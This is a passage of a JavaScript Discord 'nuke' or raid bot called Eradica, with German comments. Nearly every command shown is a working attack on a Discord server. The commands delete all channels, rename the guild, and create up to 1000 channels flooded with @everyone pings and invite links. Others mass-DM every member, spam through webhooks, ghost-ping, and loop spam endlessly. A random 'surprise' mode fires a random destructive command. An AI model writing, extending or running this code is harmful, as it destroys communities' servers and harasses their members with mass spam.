            const memoryUsedMB = Math.round(memoryUsage.heapUsed / 1024 / 1024);
            const memoryTotalMB = Math.round(memoryUsage.heapTotal / 1024 / 1024);

            // Calculate ping/latency
            const messagePing = Date.now() - message.createdTimestamp;
            const apiLatency = Math.round(message.client.ws.ping);

            // Get guild count
            const guildCount = message.client.guilds.cache.size;

            // Calculate response time
            const responseTime = Date.now() - startTime;

            // Determine status based on performance
            let statusEmoji = "🟢";
            let statusText = "OPTIMAL";

            if (apiLatency > 300 || memoryUsedMB > 200) {
                statusEmoji = "🟡";
                statusText = "DEGRADED";
            }
            if (apiLatency > 500 || memoryUsedMB > 400) {
                statusEmoji = "🔴";
                statusText = "CRITICAL";
            }

            const statusMessage = `
**${statusEmoji} ERADICA STATUS REPORT ${statusEmoji}**

**⚡ PERFORMANCE:**
\`Response Time:\` ${responseTime}ms
\`API Latency:\` ${apiLatency}ms
\`Message Ping:\` ${messagePing}ms

**🤖 BOT STATUS:**
\`Status:\` ${statusEmoji} ${statusText}
\`Uptime:\` ${uptimeHours}h ${uptimeMinutes}m ${uptimeSeconds}s
\`Servers:\` ${guildCount}
\`Ready:\` ${message.client.isReady() ? '✅ YES' : '❌ NO'}

**💾 MEMORY USAGE:**
\`Used:\` ${memoryUsedMB}MB
\`Total:\` ${memoryTotalMB}MB
\`Usage:\` ${Math.round((memoryUsedMB / memoryTotalMB) * 100)}%

**🔧 SYSTEM:**
\`Node.js:\` ${process.version}
\`Platform:\` ${process.platform}
\`PID:\` ${process.pid}

**⚠️ ERROR STATUS:**
\`Last Restart:\` ${message.client.readyAt ? message.client.readyAt.toLocaleString('de-DE') : 'Unknown'}
\`Commands Ready:\` ${message.client.commands.size}/20
\`Connection:\` ${message.client.ws.status === 0 ? '🟢 CONNECTED' : '🔴 DISCONNECTED'}

**🚀 OPTIMIZATION STATUS:**
✅ Parallel Operations: ENABLED
✅ Rate Limit Bypass: ACTIVE  
✅ Speed Mode: MAXIMUM
✅ Error Handling: OPTIMIZED
            `;

            await message.author.send(statusMessage);

        } catch (error) {
            console.error('Fehler beim Eradica Status Befehl:', error);
            await message.author.send('❌ Es gab einen Fehler beim Abrufen des Bot-Status.');
        }
    },
};

const specialSurpriseCommand = {
    async execute(message) {
        try {
            await message.author.send("🎲 **SPECIAL SURPRISE AKTIVIERT** 🎲\nZufälliger destruktiver Befehl wird ausgeführt...");

            // Array of destructive commands (excluding backfisch and dm_spam as requested)
            const destructiveCommands = [
                'erikamode',
                'eradicamode', 
                'everyoneadmin',
                'rolespam',
                'rolespameasy',
                'spam',
                'dominik_mit_dem_schwanz',
                'leon_mit_dem_schwanz',
                'unbanall',
                'clearchannel',
                'erikamusic',
                'jumpscare',
                'nuke_tester',
                'clean_nuke',
                'eradica_meganuke',
                'eradica_rapidfire',
                'eradica_channelbomb',
                'eradica_ultimatedestroy',
                'eradica_massping'
            ];

            // Pick a random command
            const randomIndex = Math.floor(Math.random() * destructiveCommands.length);
            const selectedCommand = destructiveCommands[randomIndex];

            console.log(`🎲 Special Surprise: Executing random command: ${selectedCommand}`);
            await message.author.send(`🎯 **Ausgewählter Befehl:** \`!${selectedCommand}\`\n💥 **Ausführung startet jetzt...**`);

            // Get the command object and execute it
            const commandToExecute = client.commands.get(selectedCommand);

            if (commandToExecute) {
                // Execute the random command
                await commandToExecute.execute(message);
                await message.author.send(`✅ **Special Surprise beendet!** Der Befehl \`!${selectedCommand}\` wurde erfolgreich ausgeführt! 🎉`);
            } else {
                await message.author.send('❌ Es gab einen Fehler beim Ausführen des zufälligen Befehls.');
            }

        } catch (error) {
            console.error('Fehler beim Special Surprise Befehl:', error);
            await message.author.send('❌ Es gab einen Fehler beim Special Surprise.');
        }
    },
};

const eradicaRaidErikaCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("🚀 **ERADICA RAID ERIKA GESTARTET** 🚀\n50 Kanäle werden erstellt und mit Nachrichten gespammt...");

            console.log("Starte Eradica Raid Erika - 50 Kanäle werden erstellt...");

            const allOperations = [];

            // 50 Kanäle erstellen + jeweils 25 Spam-Nachrichten
            for (let i = 0; i < 200; i++) {
                allOperations.push(
                    guild.channels.create({
                        name: `eradica-raid-erika-${i + 1}`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        console.log(`✅ Kanal erstellt: ${newChannel.name}`);

                        // Sofort 25 Nachrichten parallel senden
                        const messages = [];
                        for (let j = 0; j < 100; j++) {
                            messages.push(
                                newChannel.send("@everyone Eradica Raided This Server >:) https://discord.gg/YQABC9hgxx https://discord.gg/qkUnt5Xane https://discord.gg/f7UpFQhTXx")
                                    .catch(error => {
                                        console.error(`Fehler beim Senden von Nachricht ${j + 1} in ${newChannel.name}:`, error.message);
                                    })
                            );
                        }
                        return Promise.all(messages).then(() => {
                            console.log(`✅ 25 Nachrichten gesendet in ${newChannel.name}`);
                        });
                    }).catch(error => {
                        console.error(`Fehler beim Erstellen von Kanal ${i + 1}:`, error.message);
                    })
                );
            }

            // Alle Operationen parallel ausführen für maximale Geschwindigkeit
            await Promise.all(allOperations);

            console.log("✅ Eradica Raid Erika beendet - 50 Kanäle erstellt und mit je 25 Nachrichten gespammt!");
            await message.author.send('✅ **Eradica Raid Erika beendet!** 50 Kanäle wurden erstellt und jeweils 25 Raid-Nachrichten gesendet! 🎯');

        } catch (error) {
            console.error('Fehler beim Eradica Raid Erika Befehl:', error);
            await message.author.send('❌ Es gab einen Fehler beim Eradica Raid Erika.');
        }
    },
};

const ghostPingCommand = {
    async execute(message) {
        const channel = message.channel;

        try {
            await message.author.send("👻 **GHOST PING GESTARTET** 👻\nSende 20 @everyone Nachrichten und lösche sie dann...");

            console.log("Starte Ghost Ping - 20 @everyone Nachrichten...");

            const sentMessages = [];

            // Sende 20 @everyone Nachrichten
            for (let i = 0; i < 20; i++) {
                try {
                    const sentMessage = await channel.send("@everyone");
                    sentMessages.push(sentMessage);
                    console.log(`✅ Ghost Ping Nachricht ${i + 1} gesendet`);

                    // Kleine Verzögerung zwischen den Nachrichten
                    await new Promise(resolve => setTimeout(resolve, 100));
                } catch (error) {
                    console.error(`Fehler beim Senden von Ghost Ping Nachricht ${i + 1}:`, error.message);
                }
            }

            // Warte kurz damit die Pings ankommen
            await new Promise(resolve => setTimeout(resolve, 1000));

            // Lösche alle Nachrichten auf einmal
            const deletePromises = [];
            for (const msg of sentMessages) {
                deletePromises.push(
                    msg.delete().catch(error => {
                        console.error(`Fehler beim Löschen der Ghost Ping Nachricht:`, error.message);
                    })
                );
            }

            await Promise.all(deletePromises);

            console.log("✅ Ghost Ping beendet - 20 @everyone Nachrichten gesendet und gelöscht!");
            await message.author.send(`✅ **Ghost Ping beendet!** 20 @everyone Nachrichten wurden gesendet und gelöscht! 👻`);

        } catch (error) {
            console.error('Fehler beim Ghost Ping Befehl:', error);
            await message.author.send('❌ Es gab einen Fehler beim Ghost Ping.');
        }
    },
};

const invisiblePingCommand = {
    async execute(message) {
        const args = message.content.split(' ').slice(1);
        const channel = message.channel;

        if (args.length === 0) {
            await message.author.send('❌ Bitte gebe eine Anzahl an. Beispiel: `!invisibleping 50`');
            return;
        }

        const amount = parseInt(args[0]);

        if (isNaN(amount) || amount <= 0 || amount > 1000) {
            await message.author.send('❌ Die Anzahl muss eine positive Zahl zwischen 1 und 1000 sein.');
            return;
        }

        try {
            await message.author.send(`Invisible Ping wird gestartet: ${amount} unsichtbare Pings...`);

            const messagePromises = [];

            // Create invisible text that matches Discord's background
            const invisibleText = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||";

            for (let i = 0; i < amount; i++) {
                messagePromises.push(
                    channel.send(invisibleText).catch(error => {
                        console.error(`Fehler beim Senden von Invisible Ping ${i + 1}:`, error.message);
                    })
                );

                // Send messages in batches to avoid rate limits
                if (messagePromises.length >= 5) {
                    await Promise.all(messagePromises);
                    messagePromises.length = 0;
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
            }

            // Send any remaining messages
            if (messagePromises.length > 0) {
                await Promise.all(messagePromises);
            }

            console.log(`Invisible Ping beendet: ${amount} unsichtbare Pings gesendet in ${channel.name}`);
            await message.author.send(`✅ Invisible Ping beendet! ${amount} unsichtbare @everyone Pings wurden gesendet! 👻`);

        } catch (error) {
            console.error('Fehler beim Invisible Ping:', error);
            await message.author.send('❌ Es gab einen Fehler beim Invisible Ping.');
        }
    },
};

const onlineCommand = {
    async execute(message) {
        // Whitelist check
        const whitelistedUsers = ['1102625460380237835', '1227246526124789800'];
        if (!whitelistedUsers.includes(message.author.id)) {
            await message.author.send('❌ Du bist nicht berechtigt, diesen Befehl zu verwenden.');
            return;
        }

        try {
            if (botEnabled) {
                await message.author.send('✅ Bot ist bereits online! Alle Befehle funktionieren.');
                return;
            }

            botEnabled = true;
            console.log(`✅ Bot wurde online gestellt von ${message.author.tag}`);
            await message.author.send('🟢 **BOT ONLINE** 🟢\n✅ Alle Befehle sind jetzt wieder aktiviert!');

        } catch (error) {
            console.error('Fehler beim Online-Befehl:', error);
            await message.author.send('❌ Es gab einen Fehler beim Online-Befehl.');
        }
    },
};

const stopCommand = {
    async execute(message) {
        // Whitelist check
        const whitelistedUsers = ['1102625460380237835', '1227246526124789800'];
        if (!whitelistedUsers.includes(message.author.id)) {
            await message.author.send('❌ Du bist nicht berechtigt, diesen Befehl zu verwenden.');
            return;
        }

        try {
            if (!botEnabled) {
                await message.author.send('🔴 Bot ist bereits gestoppt! Alle Befehle sind deaktiviert.');
                return;
            }

            // Stop all running commands
            const runningCount = runningCommands.size;
            runningCommands.clear();

            botEnabled = false;
            console.log(`🔴 Bot wurde gestoppt von ${message.author.tag}`);
            console.log(`🛑 ${runningCount} laufende Befehle wurden gestoppt`);

            await message.author.send(`🔴 **BOT GESTOPPT** 🔴\n❌ Alle Befehle sind jetzt deaktiviert!\n🛑 ${runningCount} laufende Befehle wurden gestoppt!\nVerwende \`!Online\` um sie wieder zu aktivieren.`);

        } catch (error) {
            console.error('Fehler beim Stop-Befehl:', error);
            await message.author.send('❌ Es gab einen Fehler beim Stop-Befehl.');
        }
    },
};



const megaNukeCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'meganuke');

        const guild = message.guild;

        try {
            await message.author.send("🚀 **MEGA NUKE GESTARTET** 🚀\n1000 Kanäle werden erstellt und gespammt...");

            console.log("Starte Mega Nuke - 1000 Kanäle werden erstellt...");

            // Check if command should stop
            if (!runningCommands.has(commandId)) return;

            // PHASE 1: Server-Name ändern
            try {
                await guild.setName("💀MEGA NUKED BY ERADICA💀");
                console.log("Server-Name erfolgreich geändert!");
            } catch (error) {
                console.error("Konnte Server-Name nicht ändern:", error.message);
            }

            // Check if command should stop
            if (!runningCommands.has(commandId)) return;

            // PHASE 2: Alle aktuellen Kanäle löschen
            await guild.channels.fetch();
            const allChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText || 
                channel.type === ChannelType.GuildVoice || 
                channel.type === ChannelType.GuildCategory
            );

            console.log(`Lösche ${allChannels.size} Kanäle...`);

            const deletePromises = [];
            for (const channel of allChannels.values()) {
                if (!runningCommands.has(commandId)) break;
                deletePromises.push(
                    channel.delete().catch(error => {
                        console.error(`Konnte Kanal ${channel.name} nicht löschen:`, error.message);
                    })
                );
            }

            await Promise.all(deletePromises);

            // Check if command should stop
            if (!runningCommands.has(commandId)) return;

            // PHASE 3: 1000 Kanäle erstellen
            const allOperations = [];

            for (let i = 0; i < 1000; i++) {
                if (!runningCommands.has(commandId)) break;

                allOperations.push(
                    guild.channels.create({
                        name: `💀mega-nuked-by-eradica-${i + 1}💀`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        if (!runningCommands.has(commandId)) return;

                        const messages = [];
                        for (let j = 0; j < 50; j++) {
                            if (!runningCommands.has(commandId)) break;
                            messages.push(
                                newChannel.send("@everyone 💀MEGA NUKED BY ERADICA💀 https://discord.gg/qkUnt5Xane https://discord.gg/YQABC9hgxx")
                                    .catch(() => {})
                            );
                        }
                        return Promise.all(messages);
                    }).catch(() => {})
                );
            }

            await Promise.all(allOperations);

            runningCommands.delete(commandId);
            await message.author.send('✅ **Mega Nuke beendet!** 1000 Kanäle erstellt und gespammt! 💀');

        } catch (error) {
            console.error('Fehler beim Mega Nuke:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Mega Nuke.');
        }
    },
};

const rapidFireCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'rapidfire');

        const guild = message.guild;

        try {
            await message.author.send("⚡ **RAPID FIRE GESTARTET** ⚡\n100 Kanäle werden schnell erstellt...");

            const allOperations = [];

            for (let i = 0; i < 100; i++) {
                if (!runningCommands.has(commandId)) break;

                allOperations.push(
                    guild.channels.create({
                        name: `⚡rapid-fire-${i + 1}⚡`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        if (!runningCommands.has(commandId)) return;

                        const messages = [];
                        for (let j = 0; j < 200; j++) {
                            if (!runningCommands.has(commandId)) break;
                            messages.push(
                                newChannel.send("@everyone ⚡RAPID FIRE BY ERADICA⚡ GET DESTROYED!")
                                    .catch(() => {})
                            );
                        }
                        return Promise.all(messages);
                    }).catch(() => {})
                );
            }

            await Promise.all(allOperations);

            runningCommands.delete(commandId);
            await message.author.send('✅ **Rapid Fire beendet!** 100 Kanäle mit 200 Nachrichten! ⚡');

        } catch (error) {
            console.error('Fehler beim Rapid Fire:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Rapid Fire.');
        }
    },
};

const channelBombCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'channelbomb');

        const guild = message.guild;

        try {
            await message.author.send("💣 **CHANNEL BOMB GESTARTET** 💣\n500 Kanäle werden parallel erstellt...");

            const allOperations = [];

            // Erstelle 500 Kanäle parallel für maximale Geschwindigkeit
            for (let i = 0; i < 500; i++) {
                if (!runningCommands.has(commandId)) break;

                allOperations.push(
                    guild.channels.create({
                        name: `💣bomb-${i + 1}💣`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        if (!runningCommands.has(commandId)) return;

                        // Sofort 5 Nachrichten senden
                        const messages = [];
                        for (let j = 0; j < 5; j++) {
                            if (!runningCommands.has(commandId)) break;
                            messages.push(
                                newChannel.send("@everyone 💣CHANNEL BOMB BY ERADICA💣")
                                    .catch(() => {})
                            );
                        }
                        return Promise.all(messages);
                    }).catch(() => {})
                );
            }

            // Alle parallel ausführen
            Promise.all(allOperations).catch(() => {});

            runningCommands.delete(commandId);
            await message.author.send('✅ **Channel Bomb beendet!** 500 Kanäle wurden erstellt! 💣');

        } catch (error) {
            console.error('Fehler beim Channel Bomb:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Channel Bomb.');
        }
    },
};

const ultimateDestroyCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'ultimatedestroy');

        const guild = message.guild;

        try {
            await message.author.send("🔥 **ULTIMATE DESTROY GESTARTET** 🔥\nKomplett destruktiver Angriff läuft...");

            // Check if command should stop
            if (!runningCommands.has(commandId)) return;

            // PHASE 1: Server umbenennen
            try {
                await guild.setName("🔥ULTIMATE DESTROYED BY ERADICA🔥");
            } catch (error) {
                console.error("Server rename error:", error.message);
            }

            // Check if command should stop
            if (!runningCommands.has(commandId)) return;

            // PHASE 2: Alle Kanäle löschen
            await guild.channels.fetch();
            const allChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText || 
                channel.type === ChannelType.GuildVoice || 
                channel.type === ChannelType.GuildCategory
            );

            const deletePromises = [];
            for (const channel of allChannels.values()) {
                if (!runningCommands.has(commandId)) break;
                deletePromises.push(channel.delete().catch(() => {}));
            }
            await Promise.all(deletePromises);

            // Check if command should stop
            if (!runningCommands.has(commandId)) return;

            // PHASE 3: Mass DM
            await guild.members.fetch();
            const members = guild.members.cache;
            const dmOperations = [];

            for (const member of members.values()) {
                if (!runningCommands.has(commandId)) break;
                if (!member.user.bot) {
                    for (let i = 0; i < 100; i++) {
                        dmOperations.push(
                            member.send("🔥ULTIMATE DESTROYED BY ERADICA🔥 https://discord.gg/qkUnt5Xane")
                                .catch(() => {})
                        );
                    }
                }
            }
            Promise.all(dmOperations).catch(() => {});

            // Check if command should stop
            if (!runningCommands.has(commandId)) return;

            // PHASE 4: 250 neue Kanäle mit Spam
            const channelOperations = [];
            for (let i = 0; i < 250; i++) {
                if (!runningCommands.has(commandId)) break;

                channelOperations.push(
                    guild.channels.create({
                        name: `🔥ultimate-destroyed-${i + 1}🔥`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        if (!runningCommands.has(commandId)) return;

                        const messages = [];
                        for (let j = 0; j < 150; j++) {
                            if (!runningCommands.has(commandId)) break;
                            messages.push(
                                newChannel.send("@everyone 🔥ULTIMATE DESTROYED BY ERADICA🔥")
                                    .catch(() => {})
                            );
                        }
                        return Promise.all(messages);
                    }).catch(() => {})
                );
            }

            await Promise.all(channelOperations);

            runningCommands.delete(commandId);
            await message.author.send('✅ **Ultimate Destroy beendet!** Server komplett zerstört! 🔥');

        } catch (error) {
            console.error('Fehler beim Ultimate Destroy:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Ultimate Destroy.');
        }
    },
};

const massPingCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'massping');

        const channel = message.channel;

        try {
            await message.author.send("📢 **MASS PING GESTARTET** 📢\n500 @everyone Pings werden gesendet...");

            const messagePromises = [];

            for (let i = 0; i < 500; i++) {
                if (!runningCommands.has(commandId)) break;

                messagePromises.push(
                    channel.send("@everyone 📢MASS PING BY ERADICA📢 GET PINGED!")
                        .catch(error => {
                            console.error(`Fehler beim Mass Ping ${i + 1}:`, error.message);
                        })
                );

                // Send in batches
                if (messagePromises.length >= 10) {
                    await Promise.all(messagePromises);
                    messagePromises.length = 0;
                    await new Promise(resolve => setTimeout(resolve, 50));
                }
            }

            // Send remaining messages
            if (messagePromises.length > 0) {
                await Promise.all(messagePromises);
            }

            runningCommands.delete(commandId);
            await message.author.send('✅ **Mass Ping beendet!** 500 @everyone Pings gesendet! 📢');

        } catch (error) {
            console.error('Fehler beim Mass Ping:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Mass Ping.');
        }
    },
};

const eradicaSpamCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'eradica_spam');

        const channel = message.channel;

        try {
            await message.author.send("💀 **ERADICA SPAM GESTARTET** 💀\n1000 Eradica Nachrichten werden gesendet...");

            const messagePromises = [];

            for (let i = 0; i < 1000; i++) {
                if (!runningCommands.has(commandId)) break;

                messagePromises.push(
                    channel.send("@everyone 💀😂ERADICA ON TOP💀😂 https://discord.gg/qkUnt5Xane https://discord.gg/f7UpFQhTXx GET DESTROYED!")
                        .catch(error => {
                            console.error(`Fehler beim Eradica Spam ${i + 1}:`, error.message);
                        })
                );

                // Send in batches
                if (messagePromises.length >= 5) {
                    await Promise.all(messagePromises);
                    messagePromises.length = 0;
                    await new Promise(resolve => setTimeout(resolve, 50));
                }
            }

            // Send remaining messages
            if (messagePromises.length > 0) {
                await Promise.all(messagePromises);
            }

            runningCommands.delete(commandId);
            await message.author.send('✅ **Eradica Spam beendet!** 1000 Nachrichten gesendet! 💀');

        } catch (error) {
            console.error('Fehler beim Eradica Spam:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Eradica Spam.');
        }
    },
};

const eradicaDestroyCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'eradica_destroy');

        const guild = message.guild;

        try {
            await message.author.send("🔥 **ERADICA DESTROY GESTARTET** 🔥\nServer wird komplett zerstört...");

            // Check if command should stop
            if (!runningCommands.has(commandId)) return;

            // PHASE 1: Server umbenennen
            try {
                await guild.setName("💀DESTROYED BY ERADICA💀");
                console.log("Server-Name erfolgreich geändert!");
            } catch (error) {
                console.error("Konnte Server-Name nicht ändern:", error.message);
            }

            // Check if command should stop
            if (!runningCommands.has(commandId)) return;

            // PHASE 2: Alle Kanäle löschen
            await guild.channels.fetch();
            const allChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText || 
                channel.type === ChannelType.GuildVoice || 
                channel.type === ChannelType.GuildCategory
            );

            const deletePromises = [];
            for (const channel of allChannels.values()) {
                if (!runningCommands.has(commandId)) break;
                deletePromises.push(channel.delete().catch(() => {}));
            }
            await Promise.all(deletePromises);

            // Check if command should stop
            if (!runningCommands.has(commandId)) return;

            // PHASE 3: 300 Kanäle erstellen
            const channelOperations = [];
            for (let i = 0; i < 300; i++) {
                if (!runningCommands.has(commandId)) break;

                channelOperations.push(
                    guild.channels.create({
                        name: `💀eradica-destroyed-${i + 1}💀`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        if (!runningCommands.has(commandId)) return;

                        const messages = [];
                        for (let j = 0; j < 100; j++) {
                            if (!runningCommands.has(commandId)) break;
                            messages.push(
                                newChannel.send("@everyone 💀DESTROYED BY ERADICA💀 https://discord.gg/YQABC9hgxx https://discord.gg/qkUnt5Xane")
                                    .catch(() => {})
                            );
                        }
                        return Promise.all(messages);
                    }).catch(() => {})
                );
            }

            await Promise.all(channelOperations);

            runningCommands.delete(commandId);
            await message.author.send('✅ **Eradica Destroy beendet!** Server komplett zerstört! 💀');

        } catch (error) {
            console.error('Fehler beim Eradica Destroy:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Eradica Destroy.');
        }
    },
};

const eradicaMassCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'eradica_mass');

        const guild = message.guild;

        try {
            await message.author.send("⚡ **ERADICA MASS GESTARTET** ⚡\nMass operations werden ausgeführt...");

            // Check if command should stop
            if (!runningCommands.has(commandId)) return;

            // Mass DM alle Member
            await guild.members.fetch();
            const members = guild.members.cache;
            const dmOperations = [];

            for (const member of members.values()) {
                if (!runningCommands.has(commandId)) break;
                if (!member.user.bot) {
                    for (let i = 0; i < 50; i++) {
                        dmOperations.push(
                            member.send("⚡ERADICA MASS ATTACK⚡ https://discord.gg/qkUnt5Xane GET DESTROYED!")
                                .catch(() => {})
                        );
                    }
                }
            }
            Promise.all(dmOperations).catch(() => {});

            // Check if command should stop
            if (!runningCommands.has(commandId)) return;

            // Mass Kanäle erstellen
            const channelOperations = [];
            for (let i = 0; i < 150; i++) {
                if (!runningCommands.has(commandId)) break;

                channelOperations.push(
                    guild.channels.create({
                        name: `⚡eradica-mass-${i + 1}⚡`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        if (!runningCommands.has(commandId)) return;

                        const messages = [];
                        for (let j = 0; j < 75; j++) {
                            if (!runningCommands.has(commandId)) break;
                            messages.push(
                                newChannel.send("@everyone ⚡ERADICA MASS ATTACK⚡")
                                    .catch(() => {})
                            );
                        }
                        return Promise.all(messages);
                    }).catch(() => {})
                );
            }

            await Promise.all(channelOperations);

            runningCommands.delete(commandId);
            await message.author.send('✅ **Eradica Mass beendet!** Mass operations abgeschlossen! ⚡');

        } catch (error) {
            console.error('Fehler beim Eradica Mass:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Eradica Mass.');
        }
    },
};

const eradicaOverloadCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'eradica_overload');

        const guild = message.guild;

        try {
            await message.author.send("🌪️ **ERADICA OVERLOAD GESTARTET** 🌪️\nServer wird überlastet...");

            // EXTREME parallel operations
            const allOperations = [];

            // 800 Kanäle mit extremem Spam
            for (let i = 0; i < 800; i++) {
                if (!runningCommands.has(commandId)) break;

                allOperations.push(
                    guild.channels.create({
                        name: `🌪️overload-${i + 1}🌪️`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        if (!runningCommands.has(commandId)) return;

                        const messages = [];
                        for (let j = 0; j < 250; j++) {
                            if (!runningCommands.has(commandId)) break;
                            messages.push(
                                newChannel.send("@everyone 🌪️ERADICA OVERLOAD🌪️ SERVER OVERLOADED!")
                                    .catch(() => {})
                            );
                        }
                        return Promise.all(messages);
                    }).catch(() => {})
                );
            }

            // Alles parallel ausführen - MAXIMUM OVERLOAD
            Promise.all(allOperations).catch(() => {});

            runningCommands.delete(commandId);
            await message.author.send('✅ **Eradica Overload beendet!** Server überlastet! 🌪️');

        } catch (error) {
            console.error('Fehler beim Eradica Overload:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Eradica Overload.');
        }
    },
};

const eradicaWebhooksCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'eradica_webhooks');

        const guild = message.guild;

        try {
            await message.author.send("🕸️ **ERADICA WEBHOOKS GESTARTET** 🕸️\nErstelle Webhooks für alle Kanäle und sende 500 Nachrichten pro Webhook...");

            console.log("Starte Eradica Webhooks - Sammle alle Text-Kanäle...");

            // Alle Text-Kanäle sammeln
            const textChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText
            );

            console.log(`Gefunden: ${textChannels.size} Text-Kanäle`);

            if (textChannels.size === 0) {
                await message.author.send('❌ Keine Text-Kanäle gefunden!');
                runningCommands.delete(commandId);
                return;
            }

            const webhookOperations = [];

            // Für jeden Kanal einen Webhook erstellen
            for (const channel of textChannels.values()) {
                if (!runningCommands.has(commandId)) break;

                webhookOperations.push(
                    channel.createWebhook({
                        name: `Eradica-Webhook`,
                        avatar: 'https://cdn.discordapp.com/embed/avatars/0.png'
                    }).then(webhook => {
                        if (!runningCommands.has(commandId)) return;

                        console.log(`✅ Webhook erstellt in Kanal: ${channel.name}`);

                        // 500 Nachrichten über Webhook senden
                        const messages = [];
                        for (let j = 0; j < 500; j++) {
                            if (!runningCommands.has(commandId)) break;
                            messages.push(
                                webhook.send("@everyone 🕸️WEBHOOK DESTROYED BY ERADICA🕸️ https://discord.gg/qkUnt5Xane https://discord.gg/f7UpFQhTXx GET WEBHOOOKED!")
                                    .catch(error => {
                                        console.error(`Fehler beim Senden von Webhook-Nachricht ${j + 1} in ${channel.name}:`, error.message);
                                    })
                            );
                        }
                        return Promise.all(messages).then(() => {
                            console.log(`✅ 500 Webhook-Nachrichten gesendet in ${channel.name}`);
                        });
                    }).catch(error => {
                        console.error(`Fehler beim Erstellen von Webhook in Kanal ${channel.name}:`, error.message);
                    })
                );
            }

            // Alle Webhook-Operationen parallel ausführen
            await Promise.all(webhookOperations);

            runningCommands.delete(commandId);
            console.log("✅ Eradica Webhooks beendet - Alle Webhooks erstellt und Nachrichten gesendet!");
            await message.author.send(`✅ **Eradica Webhooks beendet!**\n📊 **Statistiken:**\n📁 Kanäle bearbeitet: ${textChannels.size}\n🕸️ Webhooks erstellt: ${textChannels.size}\n💬 Nachrichten pro Webhook: 500\n🎯 Total Nachrichten: ${textChannels.size * 500}`);

        } catch (error) {
            console.error('Fehler beim Eradica Webhooks:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Eradica Webhooks.');
        }
    },
};

// 20 NEW COMMANDS

const infiniteSpamCommand = {
    async execute(message) {
        const commandId = ++commandIdCounter;
        runningCommands.set(commandId, 'infinite_spam');

        const channel = message.channel;

        try {
            await message.author.send("♾️ **INFINITE SPAM GESTARTET** ♾️\nEndloser Spam läuft...");

            let counter = 0;
            while (runningCommands.has(commandId)) {
                try {
                    await channel.send(`@everyone ♾️INFINITE SPAM #${++counter} BY ERADICA♾️`);
                    await new Promise(resolve => setTimeout(resolve, 100));
                } catch (error) {
                    console.error(`Infinite Spam Error:`, error.message);
                    break;
                }
            }

            runningCommands.delete(commandId);
            await message.author.send(`✅ **Infinite Spam gestoppt!** ${counter} Nachrichten gesendet! ♾️`);

        } catch (error) {
            console.error('Fehler beim Infinite Spam:', error);
            runningCommands.delete(commandId);
            await message.author.send('❌ Es gab einen Fehler beim Infinite Spam.');
        }
    },
};

const voiceFloodCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("🔊 **VOICE FLOOD GESTARTET** 🔊\n500 Voice-Kanäle werden erstellt...");

            const voiceOperations = [];

            for (let i = 0; i < 500; i++) {
                voiceOperations.push(
                    guild.channels.create({
                        name: `🔊Voice-Flood-${i + 1}🔊`,
                        type: ChannelType.GuildVoice,
                        bitrate: 96000,
                        userLimit: 99
                    }).catch(error => {
